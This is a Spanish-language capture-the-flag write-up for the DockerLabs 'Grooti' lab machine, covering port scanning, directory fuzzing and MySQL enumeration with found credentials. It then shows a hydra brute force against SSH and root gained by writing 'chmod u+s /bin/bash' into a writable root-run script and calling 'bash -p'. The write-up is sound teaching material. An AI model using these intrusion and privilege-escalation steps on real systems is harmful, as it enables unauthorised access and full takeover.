# 🧠 **Informe de Pentesting – Máquina: Grooti**

### 💡 **Dificultad:** Fácil

📦 **Plataforma:** DockerLabs

![Despliegue](/Grooti/Imagenes/Logo.png)

---

# 🚀 **Despliegue de la Máquina**

Para iniciar la máquina vulnerable, primero descomprimimos el archivo proporcionado y posteriormente ejecutamos el script de despliegue:

```bash id="m8jv2f"
unzip grooti.zip
sudo bash auto_deploy.sh grooti.tar
```

![Despliegue](/Grooti/Imagenes/despliegue.png)

---

# 📶 **Comprobación de Conectividad**

Una vez desplegada la máquina, verificamos que el objetivo se encuentre activo y responda correctamente a peticiones ICMP:

```bash id="9zz4y2"
ping -c1 172.17.0.2
```

Esto nos permite confirmar que la máquina está encendida y accesible dentro de la red local del laboratorio.

![Despliegue](/Grooti/Imagenes/ping.png)

---

# 🔍 **Escaneo de Puertos**

## 🔎 Escaneo Completo de Puertos

Se realiza un escaneo completo sobre todos los puertos TCP para identificar los servicios expuestos en la máquina víctima:

```bash id="kwh7dn"
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2
```

### 📌 Puertos Abiertos Detectados

* `22/tcp` → Servicio SSH
* `80/tcp` → Servicio HTTP
* `3306/tcp` → Servicio MySQL

![Despliegue](/Grooti/Imagenes/nmappuerto.png)

---

## 🧩 Enumeración de Servicios y Versiones

Después de identificar los puertos abiertos, procedemos a detectar versiones y configuraciones de los servicios activos:

```bash id="ks7mbf"
nmap -sCV -p22,80,3306 172.17.0.2
```

Este análisis permite obtener información más detallada sobre los servicios en ejecución, versiones instaladas y posibles configuraciones vulnerables.

![Despliegue](/Grooti/Imagenes/nmapservicios.png)

---

# 🧭 **Reconocimiento Web**

## 🖥️ Acceso Inicial a la Aplicación Web

Accedemos al servicio web desde el navegador:

```bash id="7d6up2"
http://172.17.0.2
```

La página carga correctamente y muestra una aplicación web funcional.

![Despliegue](/Grooti/Imagenes/pagina.png)

Al revisar el código fuente de la página utilizando `CTRL + U`, encontramos una pista interesante relacionada con la estructura interna de la aplicación.

![Despliegue](/Grooti/Imagenes/codigopistapagina.png)

---

# 🗂️ **Enumeración de Directorios**

Para identificar rutas ocultas o directorios interesantes, realizamos fuzzing utilizando `gobuster`:

```bash id="p5pfb5"
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .env,.php,.bak,.old,.zip,.txt -b 403,404 --exclude-length 8068
```

Como resultado, se detectan múltiples directorios dentro de la aplicación.

![Despliegue](/Grooti/Imagenes/gobusteruno.png)

Entre todos los resultados encontrados, el directorio más interesante es:

```bash id="ikvtq4"
/secret/
```

Este directorio resulta especialmente relevante porque podría permitir acceder a archivos sensibles o funcionalidades ocultas de la aplicación.

![Despliegue](/Grooti/Imagenes/secretedirectorio.png)

---

# 📂 **Enumeración en el Directorio `/imagenes`**

Continuando con el proceso de reconocimiento, realizamos fuzzing específicamente sobre el directorio `/imagenes`:

```bash id="8m0c8p"
gobuster dir -u http://172.17.0.2/imagenes -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .env,.php,.bak,.old,.zip,.txt -b 403,404 --exclude-length 8068
```

Durante esta enumeración se encuentra un archivo `README` que contiene una contraseña.

![Despliegue](/Grooti/Imagenes/contraseñaunoreadme.png)

---

# 🛢️ **Acceso al Servicio MySQL**

Al revisar el primer archivo descargado desde el directorio `/secret`, encontramos una pista importante:

```bash id="y2v3tt"
mysql -u rocket -p -h 172.17.0.2 --ssl=0
```

![Despliegue](/Grooti/Imagenes/pistatxt.png)

El sistema solicita una contraseña, por lo que utilizamos la credencial encontrada previamente:

```bash id="e0n5yf"
password1
```

Con esto logramos autenticarnos correctamente en el servicio MySQL.

![Despliegue](/Grooti/Imagenes/accesomsql.png)

---

# 🧠 **Enumeración de Bases de Datos**

Una vez dentro de MySQL, comenzamos el proceso de enumeración buscando información útil:

* Bases de datos disponibles
* Tablas
* Columnas
* Datos sensibles
* Posibles rutas internas del sistema

Comandos utilizados:

```sql id="3h9axj"
SHOW DATABASES;
```

```sql id="nq9dnb"
USE files_secret;
```

```sql id="4i5rv0"
SHOW TABLES;
```

```sql id="7chh1q"
DESCRIBE rutas;
```

```sql id="wzy5ev"
SELECT * FROM rutas;
```

Durante esta fase descubrimos una ruta interesante almacenada dentro de la base de datos:

```bash id="vv54hb"
/unprivate/secret
```

![Despliegue](/Grooti/Imagenes/mysqlunoinfo.png)

![Despliegue](/Grooti/Imagenes/mysqldosinfo.png)

---

# 🛰️ **Análisis del Directorio `/unprivate/secret`**

Al acceder al directorio encontrado en MySQL observamos un formulario web.

![Despliegue](/Grooti/Imagenes/paginamysql.png)

El formulario permite ingresar:

* un texto,
* y un número entre 1 y 100.

Después de enviar los datos, el servidor descarga automáticamente un archivo `.txt`.

Analizando las peticiones con Burp Suite se identificó el siguiente comportamiento:

```http id="x9v5hy"
POST /unprivate/secret/generate.php HTTP/1.1
```

La aplicación generaba distintos archivos dependiendo del número enviado en el parámetro `number`.

---

# 🐍 **Automatización con Python**

Debido a que existían 100 posibles archivos, se desarrolló un script en Python para automatizar el análisis.

El objetivo del script era:

* enviar automáticamente los números del 1 al 100,
* interceptar las respuestas del servidor,
* analizar el tamaño de cada archivo descargado,
* y detectar archivos anómalos o más grandes que el resto.

Este script fue desarrollado utilizando la información obtenida al interceptar las peticiones `GET` y `POST` mediante Burp Suite.

El script se encuentra disponible dentro del directorio `Content` de la máquina Grooti.

![Despliegue](/Grooti/Imagenes/pythonuno.png)

![Despliegue](/Grooti/Imagenes/pythondos.png)

Al revisar los resultados obtenidos, observamos que el archivo correspondiente al número `16` tenía un tamaño considerablemente mayor que el resto.

Esto indicaba que probablemente contenía información relevante.

---

# 📦 **Descubrimiento del Archivo ZIP**

Al introducir el número `16` manualmente en el formulario, se descarga un archivo comprimido `.zip`.

![Despliegue](/Grooti/Imagenes/pasword.png)

Al intentar descomprimirlo utilizando `unzip`, el sistema solicita una contraseña.

Probamos utilizando la contraseña encontrada anteriormente:

```bash id="k7nj9e"
password1
```

La contraseña era válida y permitió acceder al contenido del archivo comprimido.

Dentro del archivo ZIP encontramos múltiples contraseñas potenciales.

---

# 🔐 **Preparación de Diccionarios**

A continuación, se crea:

* un archivo `.txt` con posibles usuarios,
* y otro con posibles contraseñas encontradas durante el pentesting.

![Despliegue](/Grooti/Imagenes/txtpasword.png)

![Despliegue](/Grooti/Imagenes/usertxt.png)

---

# 🚪 **Ataque de Fuerza Bruta contra SSH**

Con las listas preparadas, utilizamos `hydra` para realizar un ataque de fuerza bruta contra el servicio SSH:

```bash id="dj8r74"
hydra -L user.txt -P password16.txt ssh://172.17.0.2
```

Finalmente se descubren las credenciales válidas:

### 👤 Usuario

```bash id="mrqz6r"
grooti
```

### 🔑 Contraseña

```bash id="nq1h9u"
YoSoYgRo0t
```

Con estas credenciales logramos acceder correctamente por SSH.

![Despliegue](/Grooti/Imagenes/hydrassh.png)

---

# Nota: Antes de hacer la escalada se debe de hacer el tratamiento de TTY para evitar conflictos en la terminal

```bash
script /dev/null -c bash
```
ctrl Z (Se pondra en pausa la terminal victima)

```bash
stty raw -echo; fg
```

```bash
reset xterm
```

```bash
export TERM=xterm
```

```bash
export BASH=bash
```

---

# ⬆️ **Escalada de Privilegios**

Para realizar la escalada de privilegios se utilizó una herramienta desarrollada personalmente, disponible en mi repositorio, la cual automatiza la recopilación de información mediante conexión SSH.

La herramienta analiza:

* permisos inseguros,
* scripts automatizados,
* tareas programadas,
* archivos temporales,
* configuraciones débiles,
* y posibles vectores de escalada de privilegios.

Gracias a este análisis se identificó un archivo sospechoso dentro del directorio `/tmp`.

![Despliegue](/Grooti/Imagenes/herramienta.png)

---

# 📂 **Análisis del Directorio `/tmp`**

Al revisar manualmente el contenido de `/tmp`, encontramos un script llamado:

```bash id="9krw67"
malicious.sh
```

El archivo pertenecía al usuario `root`, pero tenía permisos de escritura inseguros:

```bash id="6vn9jv"
-rwxrw-r-- 1 root grooti 221 Jul 22 2025 malicious.sh
```

Esto significa que el usuario `grooti` tenía permisos para modificar el script, aun cuando este era ejecutado por `root`.

---

# ⚠️ **Revisión del Script Vulnerable**

Al analizar el contenido del archivo observamos lo siguiente:

```bash id="7u24pd"
#!/bin/bash

LOG_TEMP="/tmp/mi_log_temporal.log"

echo "Log temporal creado a $(date)" > "$LOG_TEMP"
echo "Archivo $LOG_TEMP creado."

sleep 2

rm -f "$LOG_TEMP"
echo "Archivo $LOG_TEMP eliminado después de 2 segundos."
```

El script:

* creaba un archivo temporal `.log`,
* esperaba 2 segundos,
* y posteriormente lo eliminaba.

El comportamiento indicaba que probablemente el script era ejecutado automáticamente por `root` mediante una tarea programada o proceso automatizado.

---

# 🛠️ **Modificación del Script**

Debido a que el archivo tenía permisos de escritura inseguros, fue posible modificar su contenido.

Se comentaron las líneas originales y se añadió el siguiente comando:

```bash id="4j9pqz"
chmod u+s /bin/bash
```

El objetivo de este comando era asignar el bit `SUID` a `/bin/bash`.

Cuando un binario tiene el bit `SUID` habilitado y pertenece a `root`, cualquier usuario que lo ejecute podrá hacerlo con privilegios elevados.

El contenido final del script quedó similar a:

```bash id="4shn2e"
#!/bin/bash

#LOG_TEMP="/tmp/mi_log_temporal.log"

#echo "Log temporal creado a $(date)" > "$LOG_TEMP"
#echo "Archivo $LOG_TEMP creado."

#sleep 2

#rm -f "$LOG_TEMP"
#echo "Archivo $LOG_TEMP eliminado después de 2 segundos."

chmod u+s /bin/bash
```

---

# 👑 **Obtención de Root**

Después de esperar a que el sistema ejecutara nuevamente el script automatizado, se utilizó el siguiente comando:

```bash id="sfp79e"
bash -p
```

La opción `-p` permite conservar los privilegios efectivos del binario `bash` cuando posee el bit `SUID`.

Finalmente, verificamos los privilegios obtenidos:

```bash id="a4frq7"
whoami
```

Resultado:

```bash id="sq4xnp"
root
```

Con esto se consiguió acceso completo al sistema como superusuario.

![Despliegue](/Grooti/Imagenes/root.png)

---

